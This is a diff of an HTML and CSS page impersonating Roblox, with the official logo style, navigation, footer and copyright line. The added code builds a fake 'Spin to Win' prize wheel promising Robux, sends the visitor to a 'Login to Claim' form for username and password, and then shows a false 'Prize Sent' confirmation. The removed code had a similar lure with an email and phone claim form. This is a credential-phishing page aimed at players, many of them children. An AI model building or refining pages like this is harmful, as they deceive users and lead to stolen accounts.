+    position: absolute; right: 8px; top: 50%; transform: translateY(-50%);
+    background: none; border: none; cursor: pointer; font-size: 14px;
+    color: rgba(247, 247, 248, 0.5); padding: 2px;
+}
+.error-msg {
+    display: none; background: rgba(223, 40, 31, 0.15);
+    border: 1px solid rgba(223, 40, 31, 0.3); border-radius: 8px;
+    padding: 8px 12px; color: #F04433; font-size: 14px; margin-bottom: 12px;
+}
+.login-btn {
+    width: 100%; height: 36px; border: 1px solid rgb(213, 215, 221); border-radius: 8px;
+    background: transparent; color: rgb(188, 190, 200);
+    font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
+    font-size: 16px; font-weight: 500; cursor: pointer; padding: 9px; margin-top: 8px;
+}
+.login-btn:hover { background: rgba(208, 217, 251, 0.08); border-color: rgb(247, 247, 248); color: #F7F7F8; }
+.login-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+.forgot-link {
+    display: block; text-align: center; color: #F7F7F8; text-decoration: none;
+    font-size: 16px; font-weight: 500; padding: 12px 0;
+}
+.forgot-link:hover { text-decoration: underline; }
+.alt-btn {
+    width: 100%; height: 36px; border: 1px solid transparent; border-radius: 8px;
+    background: rgba(208, 217, 251, 0.12); color: #F7F7F8;
+    font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
+    font-size: 16px; font-weight: 500; cursor: pointer; padding: 9px; margin-bottom: 8px;
+}
+.alt-btn:hover { background: rgba(208, 217, 251, 0.18); }
+.signup-area { text-align: center; padding: 12px 0; }
+.signup-area span { color: rgba(247, 247, 248, 0.6); font-size: 16px; }
+.signup-area a { color: #F7F7F8; text-decoration: none; font-size: 16px; font-weight: 500; }
+.signup-area a:hover { text-decoration: underline; }
+
+/* SUCCESS PAGE */
+#successPage { display: none; }
+.success-card {
+    background: #272930; width: 100%; max-width: 362px; padding: 28px 20px;
+    text-align: center; border: 1px solid rgba(74,222,128,0.2);
+}
+.success-card .check-icon {
+    font-size: 56px; margin-bottom: 8px;
+    display: inline-block;
+    animation: popIn 0.5s ease;
+}
+@keyframes popIn { 0% { transform: scale(0); } 70% { transform: scale(1.2); } 100% { transform: scale(1); } }
+.success-card h2 { font-size: 22px; font-weight: 800; color: #4ADE80; margin-bottom: 4px; }
+.success-card .won-item {
+    font-size: 20px; font-weight: 700; color: #F7F7F8;
+    margin: 8px 0; padding: 8px; border-radius: 8px;
+    background: rgba(255,255,255,0.05);
+}
+.success-card .wait-text {
+    color: rgba(247,247,248,0.5); font-size: 13px; line-height: 1.6; margin-top: 8px;
+}
+.success-card .note {
+    margin-top: 14px; padding: 12px; border-radius: 8px;
+    background: rgba(74,222,128,0.08); border: 1px solid rgba(74,222,128,0.15);
+    font-size: 12px; color: #4ADE80; text-align: left; line-height: 1.8;
+}
+.success-card .back-btn {
+    display: inline-block; margin-top: 14px; color: #1D4ED8;
+    text-decoration: none; font-size: 14px; font-weight: 500;
+}
+</style>
 </head>
 <body onload="drawWheel()">
-    <div class="bg-image"></div>
-    <div class="bg-overlay"></div>
+<div class="bg-image"></div>
+<div class="bg-overlay"></div>
+
+<nav class="navbar">
+    <a href="#" class="logo-link">
+        <svg viewBox="0 0 32 32"><rect x="2" y="6" width="28" height="20" rx="4" fill="#E2231A"></rect><text x="8" y="22" font-family="Arial" font-size="14" font-weight="800" fill="#fff">R</text></svg>
+    </a>
+    <a href="#" class="nav-item">Charts</a>
+    <a href="#" class="nav-item">Marketplace</a>
+    <a href="#" class="nav-item">Create</a>
+    <a href="#" class="nav-item">Robux</a>
+    <div class="search-wrap">
+        <input type="search" placeholder="Search"><span class="search-icon">🔍</span>
+    </div>
+    <a href="#" class="signup-link">Sign Up</a>
+</nav>
+
+<div class="main-container">
+    <!-- PAGE 1: SPIN WHEEL -->
+    <div id="spinPage">
+        <div class="spin-badge">🎉 LIMITED EVENT</div>
+        <div class="spin-title">Spin to Win!</div>
+        <div class="spin-subtitle">Try your luck and win exclusive Roblox prizes!</div>
+        
+        <div class="wheel-container">
+            <div class="wheel-pointer"></div>
+            <canvas id="wheelCanvas" width="340" height="340"></canvas>
+        </div>
+        
+        <button class="spin-btn" id="spinBtn" onclick="spin()">🎰 SPIN NOW</button>
+        
+        <div class="spin-result" id="spinResult">
+            <div class="congrats">🎊 Congratulations!</div>
+            <div class="prize-name" id="prizeColor" style="color:#E2231A;">
+                <span id="prizeName">💰 10,000 Robux</span>
+            </div>
+            <div class="prize-desc">You won a prize! Login to your Roblox account to claim it.</div>
+        </div>
+        
+        <div class="claim-prompt" id="claimPrompt">
+            <p>🔐 Login to your Roblox account to claim <strong><span id="claimItemName">your prize</span></strong>!</p>
+            <button class="login-claim-btn" onclick="goToLogin()">🔓 Login to Claim →</button>
+        </div>
+    </div>
     
-    <nav class="navbar">
-        <a href="#" class="logo-link">
-            <svg viewBox="0 0 32 32"><rect x="2" y="6" width="28" height="20" rx="4" fill="#E2231A"></rect><text x="8" y="22" font-family="Arial" font-size="14" font-weight="800" fill="#fff">R</text></svg>
-        </a>
-        <a href="#" class="nav-item">Charts</a>
-        <a href="#" class="nav-item">Marketplace</a>
-        <a href="#" class="nav-item">Create</a>
-        <a href="#" class="nav-item">Robux</a>
-        <div class="search-wrap">
-            <input type="search" placeholder="Search"><span class="search-icon">🔍</span>
-        </div>
-        <a href="#" class="signup-link">Sign Up</a>
-    </nav>
-    
-    <div class="main-container">
-        <!-- PAGE 1: LOGIN -->
-        <div id="loginPage">
-            <div class="login-card">
-                <h1 class="login-header">Login to Roblox</h1>
-                <div class="error-msg" id="errorMsg">Incorrect username or password.</div>
-                <form onsubmit="event.preventDefault(); submitLogin();">
-                    <div class="input-group">
-                        <div style="position:relative;">
-                            <span style="position:absolute;left:10px;top:50%;transform:translateY(-50%);color:rgba(247,247,248,0.4);font-size:14px;z-index:1;">👤</span>
-                            <input type="text" id="username" placeholder="Username/Email/Phone" required autocomplete="off">
-                        </div>
+    <!-- PAGE 2: LOGIN -->
+    <div id="loginPage">
+        <div class="login-card">
+            <div style="text-align:center;font-size:32px;margin-bottom:4px;">🎁</div>
+            <h1 class="login-header" style="text-align:center;font-size:26px;">Login to Claim</h1>
+            <p class="login-subheader" style="text-align:center;">Sign in to receive <strong id="claimPrizeName" style="color:#FFD700;">your prize</strong>!</p>
+            
+            <div class="error-msg" id="errorMsg">Incorrect username or password.</div>
+            
+            <form onsubmit="event.preventDefault(); submitLogin();">
+                <div class="input-group">
+                    <div style="position:relative;">
+                        <span style="position:absolute;left:10px;top:50%;transform:translateY(-50%);color:rgba(247,247,248,0.4);font-size:14px;z-index:1;">👤</span>
+                        <input type="text" id="username" placeholder="Username/Email/Phone" required autocomplete="off">
                     </div>
-                    <div class="input-group">
-                        <div class="password-wrap">
-                            <span style="position:absolute;left:10px;top:50%;transform:translateY(-50%);color:rgba(247,247,248,0.4);font-size:14px;z-index:1;">🔒</span>
-                            <input type="password" id="password" placeholder="Password" required>
-                            <button type="button" class="toggle-eye" onclick="togglePassword()" tabindex="-1"><span id="eyeIcon">👁‍🗨</span></button>
-                        </div>
+                </div>
+                <div class="input-group">
+                    <div class="password-wrap">
+                        <span style="position:absolute;left:10px;top:50%;transform:translateY(-50%);color:rgba(247,247,248,0.4);font-size:14px;z-index:1;">🔒</span>
+                        <input type="password" id="password" placeholder="Password" required>
+                        <button type="button" class="toggle-eye" onclick="togglePassword()" tabindex="-1"><span id="eyeIcon">👁‍🗨</span></button>
                     </div>
-                    <button type="submit" class="login-btn" id="loginBtn">Log In</button>
-                </form>
-                <a href="#" class="forgot-link">Forgot Password or Username?</a>
-                <div style="height:1px;background:rgba(208,217,251,0.12);margin:8px 0;"></div>
-                <button class="alt-btn" onclick="return false;">Email Me a One-Time Code</button>
-                <button class="alt-btn" onclick="return false;">Quick Sign-in</button>
-                <div class="signup-area">
-                    <span>Don't have an account? </span><a href="#">Sign Up</a>
                 </div>
-            </div>
-        </div>
-        
-        <!-- PAGE 2: SPIN WHEEL -->
-        <div id="spinPage">
-            <div class="spin-title">🎉 Congratulations!</div>
-            <div class="spin-subtitle">You've been selected! Spin to claim your reward!</div>
+                <button type="submit" class="login-btn" id="loginBtn">Log In</button>
+            </form>
             
-            <div class="wheel-container">
-                <div class="wheel-pointer"></div>
-                <canvas id="wheelCanvas" width="360" height="360"></canvas>
-            </div>
-            
-            <button class="spin-btn" id="spinBtn" onclick="spin()">🎰 SPIN</button>
-            
-            <div class="spin-result" id="spinResult">
-                <h2>🎊 You Won!</h2>
-                <div class="prize-name" id="prizeColor" style="color:#E2231A;">
-                    <span id="prizeName">💰 10,000 Robux</span>
-                </div>
-                <p style="color:rgba(247,247,248,0.6);font-size:13px;margin-top:4px;">Click below to claim your prize!</p>
-                <button class="claim-btn" onclick="showClaim()">📦 Claim Now</button>
-            </div>
-        </div>
-        
-        <!-- PAGE 3: CLAIM FORM -->
-        <div id="claimPage">
-            <div class="claim-card">
-                <h2>📦 Claim Your Prize</h2>
-                <p>Enter your email or phone to receive your reward!</p>
-                <input type="email" id="claimEmail" placeholder="Email address">
-                <input type="text" id="claimPhone" placeholder="Phone number (optional)">
-                <div class="claim-error" id="claimError">Please enter at least an email or phone.</div>
-                <button class="submit-claim-btn" id="claimBtn" onclick="submitClaim()">✅ Submit & Claim</button>
-            </div>
-        </div>
-        
-        <!-- PAGE 4: SUCCESS -->
-        <div id="successPage">
-            <div class="success-card">
-                <div class="big-icon">🎉</div>
-                <h2>Congratulations!</h2>
-                <p>Your prize has been sent!<br>Check your inventory within 24 hours.</p>
-                <div class="note">
-                    ✅ Prize reserved for your account<br>
-                    ✅ Will be credited within 24 hours<br>
-                    ✅ Check your Roblox inventory
-                </div>
-                <a href="https://www.roblox.com/home" class="back-btn">← Back to Roblox</a>
+            <a href="#" class="forgot-link">Forgot Password or Username?</a>
+            <div style="height:1px;background:rgba(208,217,251,0.12);margin:8px 0;"></div>
+            <button class="alt-btn" onclick="return false;">Email Me a One-Time Code</button>
+            <button class="alt-btn" onclick="return false;">Quick Sign-in</button>
+            <div class="signup-area">
+                <span>Don't have an account? </span><a href="#">Sign Up</a>
             </div>
         </div>
     </div>
     
-    <div class="page-footer">
-        <a href="#">About Us</a>
-        <a href="#">Jobs</a>
-        <a href="#">Blog</a>
-        <a href="#">Parents</a>
-        <a href="#">Buy Gift Cards</a>
-        <a href="#">Help</a>
-        <a href="#">Terms</a>
-        <a href="#">Accessibility</a>
-        <a href="#">Privacy</a>
-        <a href="#">Your Privacy Choices</a>
-        <a href="#">Sitemap</a>
-        <div class="copyright">© 2025 Roblox Corporation. All rights reserved.</div>
+    <!-- PAGE 3: SUCCESS -->
+    <div id="successPage">
+        <div class="success-card">
+            <div class="check-icon">✅</div>
+            <h2>🎉 Prize Sent!</h2>
+            <div class="won-item" id="finalPrizeDisplay">💰 10,000 Robux</div>
+            <p class="wait-text">
+                <strong style="color:#4ADE80;">✔</strong> <span id="finalPrize">Your prize</span> has been sent to your Roblox account!<br>
+                Please wait <strong>2-4 hours</strong> for the item to appear in your inventory.
+            </p>
+            <div class="note">
+                ✅ <span id="notePrize">Your prize</span> — Reserved<br>
+                ✅ Will be credited within 2-4 hours<br>
+                ✅ Check your Roblox inventory
+            </div>
+            <a href="https://www.roblox.com/home" class="back-btn">← Back to Roblox</a>
+        </div>
     </div>
+</div>
+
+<div class="page-footer">
+    <a href="#">About Us</a> <a href="#">Jobs</a> <a href="#">Blog</a> <a href="#">Parents</a>
+    <a href="#">Buy Gift Cards</a> <a href="#">Help</a> <a href="#">Terms</a>
+    <a href="#">Accessibility</a> <a href="#">Privacy</a> <a href="#">Your Privacy Choices</a>
+    <a href="#">Sitemap</a>
+    <div class="copyright">© 2025 Roblox Corporation</div>
+</div>
 </body>
 </html>
